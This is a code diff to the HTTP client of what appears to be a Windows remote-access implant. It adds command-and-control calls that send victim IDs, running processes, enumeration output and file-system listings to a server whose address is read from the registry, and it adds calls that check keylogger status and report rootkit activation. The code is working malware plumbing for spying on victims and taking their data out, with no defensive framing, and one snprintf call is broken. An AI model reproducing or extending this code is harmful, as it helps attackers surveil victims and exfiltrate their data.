@@ -6,12 +6,25 @@
 #include <iomanip>
 #include <sstream>
 #include <string>
+#include <codecvt>
+#include "IPC.h"
 #include "resource.h"
+
 
 using namespace std;
 
 class httpRequest {
 public:
+
+    IPC ipc = IPC();
+    wstring SERVER_BASE_URL_FINAL = ipc.readDomainFromRegistry();
+
+    static std::wstring StringToWideString(const std::string& str) {
+        int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), nullptr, 0);
+        std::wstring wstrTo(size_needed, 0);
+        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), &wstrTo[0], size_needed);
+        return wstrTo;
+    }
 
     static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
         size_t total_size = size * nmemb;
@@ -68,10 +81,14 @@ public:
         CURLcode res;
         curl_global_init(CURL_GLOBAL_DEFAULT);
         curl = curl_easy_init();
-        id = XOR(id, "S12Secret");
+        //id = XOR(id, "S12Secret");
+        wstring url = SERVER_BASE_URL_FINAL + L"/Action";
+        string urlStr(url.begin(), url.end());
 
         if (curl) {
-            curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action");
+
+            // send to SERVER_BASE_URL_FINAL + L"/Action"
+            curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
             curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
             struct curl_slist* headers = NULL;
@@ -85,7 +102,7 @@ public:
 
             const char* id_cstr = id.c_str();
             char post_data[256]; 
-            snprintf(post_data, sizeof(post_data), "{\"id\": \"%s\"}", id_cstr);
+            snprintf(post_data, sizeof(post_data), "{\"id\": \"%s\"}", id);
 
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             string response_data;
@@ -98,10 +115,67 @@ public:
         }  
      }
 
+    bool itsKeyloggerActive(string id) {
+        // petition to Action/LoggerStatus
+        // if the response is "true" then the keylogger returns true
+        // if the response is "false" then the keylogger returns false
+        httpRequest http = httpRequest();
+        string XappTimestamp = http.createTimeStamp();
+        string XAppSignature = http.createSignature("/Action/LoggerStatus");
+
+        CURL* curl;
+        CURLcode res;
+        curl_global_init(CURL_GLOBAL_DEFAULT);
+        curl = curl_easy_init();
+        wstring url = SERVER_BASE_URL_FINAL + L"/Action/LoggerStatus";
+        string urlStr(url.begin(), url.end());
+
+        if (curl) {
+			curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
+			curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+			struct curl_slist* headers = NULL;
+			headers = curl_slist_append(headers, "Content-Type: application/json");
+			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+			headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
+			headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
+			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+			const char* id_cstr = id.c_str();
+			char post_data[256];
+			snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\"}", id_cstr);
+
+			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+			string response_data;
+			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
+			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
+			res = curl_easy_perform(curl);
+			curl_global_cleanup();
+			curl_easy_cleanup(curl);
+
+			if (response_data == "true") {
+				return true;
+			}
+			else {
+				return false;
+			}
+		}
+
+
+
+
+		
+    }
+
         string httpGetParamsAction(string victimID, string actionID) {
             httpRequest http = httpRequest();
             string XappTimestamp = http.createTimeStamp();
             string XAppSignature = http.createSignature("/Action/DoAction");
+
+            wstring url = SERVER_BASE_URL_FINAL + L"/Action/DoAction";
+            string urlStr(url.begin(), url.end());
 
             // XAppSignature
             CURL* curl;
@@ -114,13 +188,11 @@ public:
             }
             else {
 				actionID = "10Special";
-            }
+            }           
 
-            victimID = XOR(victimID, "S12Secret");
-            
 
             if (curl) {
-                curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action/DoAction");
+                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
                 curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
                 struct curl_slist* headers = NULL;
@@ -147,6 +219,141 @@ public:
                 curl_easy_cleanup(curl);
                 return response_data;
             }
+        }
+
+        bool rootkitInitialitzated(string id) {
+			httpRequest http = httpRequest();
+			string XappTimestamp = http.createTimeStamp();
+			string XAppSignature = http.createSignature("/Action/ActiveRootkit");
+
+			CURL* curl;
+			CURLcode res;
+			curl_global_init(CURL_GLOBAL_DEFAULT);
+			curl = curl_easy_init();
+			wstring url = SERVER_BASE_URL_FINAL + L"/Action/ActiveRootkit";
+			string urlStr(url.begin(), url.end());
+
+            if (curl) {
+                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
+                curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+                struct curl_slist* headers = NULL;
+                headers = curl_slist_append(headers, "Content-Type: application/json");
+                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
+                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
+                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+                const char* id_cstr = id.c_str();
+                char post_data[256];
+                snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\"}", id_cstr);
+
+                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+                // no response data
+                res = curl_easy_perform(curl);
+                curl_global_cleanup();
+                curl_easy_cleanup(curl);
+                return true;
+            }
+		}
+
+
+        string httpSendProcesses(string id, string processes) {
+            httpRequest http = httpRequest();
+            string XappTimestamp = http.createTimeStamp();
+            string XAppSignature = http.createSignature("/Process");
+
+            CURL* curl;
+            CURLcode res;
+            curl_global_init(CURL_GLOBAL_DEFAULT);
+            curl = curl_easy_init();
+            wstring url = SERVER_BASE_URL_FINAL + L"/Process";
+            string urlStr(url.begin(), url.end());
+
+            if (curl) {
+				curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
+				curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+				struct curl_slist* headers = NULL;
+				headers = curl_slist_append(headers, "Content-Type: application/json");
+				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+				curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+				headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
+				headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
+				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+                string post_data = "{\"id\":\"" + id + "\", \"processes\":\"" + processes + "\"}";
+				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
+
+				string response_data;
+				curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+				curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
+				res = curl_easy_perform(curl);
+
+				if (res != CURLE_OK) {
+					fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+				}
+
+				long http_response_code;
+				curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
+				std::cout << "HTTP Response Code: " << http_response_code << std::endl;
+
+				curl_global_cleanup();
+				curl_easy_cleanup(curl);
+
+				return response_data;
+			}
+        }
+
+        string sendEnumeration(string victimID, string result) {
+			httpRequest http = httpRequest();
+			string XappTimestamp = http.createTimeStamp();
+			string XAppSignature = http.createSignature("/Enumeration");
+
+			CURL* curl;
+			CURLcode res;
+			curl_global_init(CURL_GLOBAL_DEFAULT);
+			curl = curl_easy_init();
+			wstring url = SERVER_BASE_URL_FINAL + L"/Action/OutputEnumerate";
+			string urlStr(url.begin(), url.end());
+
+			if (curl) {
+				curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
+				curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+				struct curl_slist* headers = NULL;
+				headers = curl_slist_append(headers, "Content-Type: application/json");
+				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+				curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+				headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
+				headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
+				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+				string post_data = "{\"id\":\"" + victimID + "\", \"result\":\"" + result + "\"}";
+				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
+
+				string response_data;
+				curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+				curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
+				res = curl_easy_perform(curl);
+
+				if (res != CURLE_OK) {
+					fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+				}
+
+				long http_response_code;
+				curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
+				std::cout << "HTTP Response Code: " << http_response_code << std::endl;
+
+				curl_global_cleanup();
+				curl_easy_cleanup(curl);
+
+				return response_data;
+			}
         }
 
         string httpGetParams(string victimID, string actionID) {
@@ -168,10 +375,12 @@ public:
             }
 
             victimID = secretOperation(victimID);
+            wstring url = SERVER_BASE_URL_FINAL + L"/Action/SecretOperation";
+            string urlStr(url.begin(), url.end());
 
 
             if (curl) {
-                curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action/SecretOperation");
+                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
                 curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
                 struct curl_slist* headers = NULL;
@@ -200,6 +409,55 @@ public:
             }
         }
 
+        string httpSendFileSystemStructure(string victimID, string actionID, string& fileSystemStructure) {
+            httpRequest http = httpRequest();
+            string XappTimestamp = http.createTimeStamp();
+            string XAppSignature = http.createSignature("/File/FileSystem");
+
+            CURL* curl;
+            CURLcode res;
+            curl_global_init(CURL_GLOBAL_DEFAULT);
+            curl = curl_easy_init();
+            wstring url = SERVER_BASE_URL_FINAL + L"/File/FileSystem";
+            string urlStr(url.begin(), url.end());
+
+            if (curl) {                
+                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
+                curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+                struct curl_slist* headers = NULL;
+                headers = curl_slist_append(headers, "Content-Type: application/json");
+                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
+                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
+                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+
+                string post_data = "{\"victimID\":\"" + victimID + "\", \"actionID\":\"" + actionID + "\", \"fileSystemStructure\":\"" + fileSystemStructure + "\"}";
+                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
+
+                string response_data;
+                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
+                res = curl_easy_perform(curl);
+
+                if (res != CURLE_OK) {
+                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+                }
+
+                long http_response_code;
+                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
+                std::cout << "HTTP Response Code: " << http_response_code << std::endl;
+
+                curl_global_cleanup();
+                curl_easy_cleanup(curl);
+
+                return response_data;
+            }
+        }
+
 
 	
 private:
@@ -210,6 +468,13 @@ private:
 		}
 		return output;
 	}
+
+    //static std::wstring StringToWideString(const std::string& str) {
+    //    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), nullptr, 0);
+    //    std::wstring wstrTo(size_needed, 0);
+    //    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), &wstrTo[0], size_needed);
+    //    return wstrTo;
+    //}
 
     static string secretOperation(string data) {
         int dataInt = stoi(data);
